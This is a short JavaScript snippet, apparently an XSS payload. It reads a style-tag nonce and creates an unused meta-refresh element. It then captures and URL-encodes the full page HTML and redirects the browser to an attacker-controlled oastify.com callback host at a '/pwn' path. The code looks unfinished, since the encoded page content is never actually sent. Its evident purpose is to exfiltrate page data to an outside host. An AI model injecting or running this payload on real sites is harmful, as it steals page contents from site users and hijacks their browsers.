// Get the nonce from the style tag
const nonce = document.getElementsByTagName('style')[0].nonce;


// Create meta refresh element
var meta = document.createElement('meta');
meta.setAttribute('http-equiv', 'refresh');

// Get all DOM content
var domContent = document.documentElement.outerHTML;

// Encode the DOM content for URL
var encodedDOM = encodeURIComponent(domContent);

window.location.replace("https://c8lgzsk4wd1wfi8hwcipb9vap1vsjji77.oastify.com/pwn")
